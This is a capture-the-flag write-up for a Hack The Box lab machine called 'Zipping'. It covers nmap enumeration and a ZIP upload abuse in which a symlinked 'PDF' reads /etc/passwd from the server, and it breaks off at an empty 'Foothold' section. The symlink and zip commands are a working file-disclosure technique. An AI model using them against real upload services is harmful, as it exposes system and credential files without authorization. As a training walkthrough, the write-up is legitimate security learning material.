# HTB Machine Writeup: Zipping
### By: gnos1s

## Machine Difficulty: Medium
## Operating System: Linux

## Enumeration

As usual, we start off with our Nmap scan:

```
$ nmap -sC -sV -oA nmap/zipping 10.10.11.229
Nmap scan report for 10.10.11.229
Host is up (0.53s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Only ports 22 and 80 are open. Let's visit the website. It seems to be a "watch store":

![home](posts/HTB%20Machines/Zipping/assets/home.png)

All of the links on the top right don't lead to anything interesting, other than the shop and the "work with us". Let's check out the "work with us":

![upload](posts/HTB%20Machines/Zipping/assets/upload.png)

We can upload files, but it only allows PDF files inside a ZIP archive. We get an error if we try to upload anything else. Let's try uploading a PDF:

```
$ touch test.pdf
$ zip initial.zip test.pdf
```

Next, we can upload it:

![initial](initial.png)

Clicking on the link redirects us to the pdf we just uploaded. Now, let's think about how to exploit this.

## File Disclosure

After reading [this](https://book.hacktricks.xyz/pentesting-web/file-upload) article on HackTricks, from the "Zip/Tar File Automatically decompressed Upload", there actually is a way to use this file upload to get a file disclosure on the box. 

First, we have to create a symlink:

```
$ ln -s ../../../../../etc/passwd passwd.pdf
$ zip --symlinks passwd.zip passwd.pdf
  adding: passwd.txt (stored 0%)
```

Now, when we upload the file to the server, we can read the content of /etc/passwd on the box:

```
$ curl http://10.10.11.229/uploads/40e8ae53db79025eb8f9dfd4c282e35a/passwd.pdf
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

This works because we created a symbolic link to /etc/passwd on the box. Although the filename is in .pdf format, it's not a pdf file; the operating system treats this file as a symlink. And since we have it linked to /etc/passwd, the webapp will go fetch the /etc/passwd file for us.

## Foothold

Now, we can use what the file disclosure to read the soruce code of the webapp. Let's try /var/www/html as the path to the site, and it works:

```

```
